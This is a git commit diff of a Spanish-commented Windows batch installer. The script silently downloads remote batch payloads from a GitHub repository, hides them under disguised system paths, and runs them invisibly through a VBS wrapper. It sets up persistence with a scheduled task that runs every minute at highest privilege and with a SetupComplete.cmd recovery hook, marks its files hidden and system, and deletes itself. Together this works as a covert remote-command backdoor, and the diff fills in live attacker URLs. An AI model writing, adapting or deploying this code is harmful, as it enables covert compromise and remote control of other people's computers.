f7719bf90758b83a65f0569300544282d843f318
Shojo 3 <kokoronoshojo@gmail.com>
2026-04-06 00:52:13 -0600

    instalador.bat

--- instalador.bat
+++ instalador.bat
@@ -3,19 +3,29 @@ setlocal enabledelayedexpansion
 
 :: --- 1. CONFIGURACIÓN DE RUTAS Y RECURSOS ---
 set "DIR_SISTEMA=C:\Windows\System32\drivers\etc\vps_logs"
-set "DIR_AGENTE=%AppData%\Roaming\Microsoft\Vault"
+set "DIR_AGENTE=%AppData%
+\Microsoft\Vault"
 set "DIR_RECOVERY=C:\Windows\Setup\Scripts"
 set "TARGET_RESET=%DIR_RECOVERY%\SetupComplete.cmd"
 
 :: URLS DE TU CONTROL (Cámbialas por tus links Raw de GitHub)
-set "URL_AGENTE=https://raw.githubusercontent.com/TU_USUARIO/TU_REPO/main/agente.bat"
-set "URL_RESTAURADOR=https://raw.githubusercontent.com/TU_USUARIO/TU_REPO/main/restaurador.bat"
-
+set "URL_AGENTE=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAssets/SystemAssets/agente.bat"
+set "URL_RESTAURADOR=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAssets/SystemAssets/WinNetHealth.bat"
 :: --- 2. CREACIÓN DE INFRAESTRUCTURA (SILENCIOSA) ---
 if not exist "%DIR_SISTEMA%" mkdir "%DIR_SISTEMA%" >nul 2>&1
 if not exist "%DIR_AGENTE%" mkdir "%DIR_AGENTE%" >nul 2>&1
 if not exist "%DIR_RECOVERY%" mkdir "%DIR_RECOVERY%" >nul 2>&1
 
+:: --- 2.1 DESBLOQUEO Y LIMPIEZA PARA SOBREESCRITURA ---
+:: Le quitamos el seguro de "Solo Lectura", "Oculto" y "Sistema" a las versiones viejas
+attrib -h -s -r "%DIR_AGENTE%\sys_engine.bat" >nul 2>&1
+attrib -h -s -r "%DIR_AGENTE%\run.vbs" >nul 2>&1
+attrib -h -s -r "%DIR_SISTEMA%\WinNetHealth.bat" >nul 2>&1
+
+:: Borramos los archivos viejos a la fuerza (/f) y en silencio (/q) por si acaso
+del /f /q "%DIR_AGENTE%\sys_engine.bat" >nul 2>&1
+del /f /q "%DIR_AGENTE%\run.vbs" >nul 2>&1
+del /f /q "%DIR_SISTEMA%\WinNetHealth.bat" >nul 2>&1    
 :: --- 3. DESCARGA DE COMPONENTES ---
 powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_AGENTE%', '%DIR_AGENTE%\sys_engine.bat')" >nul 2>&1
 powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_RESTAURADOR%', '%DIR_SISTEMA%\WinNetHealth.bat')" >nul 2>&1
@@ -44,7 +54,7 @@ echo Set WshShell = CreateObject("WScript.Shell") > "%DIR_AGENTE%\run.vbs"
 echo WshShell.Run "cmd.exe /c %DIR_AGENTE%\sys_engine.bat", 0, False >> "%DIR_AGENTE%\run.vbs"
 :: --- 6. REGISTRO DE TAREAS (Configuración de Testeo) ---
 
-:: Tarea 1: El Agente (Revisión de órdenes cada 30 minutos)
+:: Tarea 1: El Agente (Revisión de órdenes cada 1 minutos)
 :: /sc minute /mo 30 -> Ejecuta cada 30 minutos, las 24 horas del día.
 schtasks /create /tn "WinSystemVault" /tr "wscript.exe %DIR_AGENTE%\run.vbs" /sc minute /mo 1 /rl highest /f >nul 2>&1
 
@@ -59,7 +69,8 @@ attrib +h +s +r "%DIR_SISTEMA%\WinNetHealth.bat" >nul 2>&1
 :: Ejecutamos el restaurador una vez para confirmar que todo arrancó bien
 start /b "" cmd /c "%DIR_SISTEMA%\WinNetHealth.bat"
 
-:: AUTODESTRUCCIÓN
+
 schtasks /delete /tn "WinSystemVault" /f >nul 2>&1
+:: AUTODESTRUCCIÓN
 timeout /t 2 /nobreak >nul
 del "%~f0" & exit
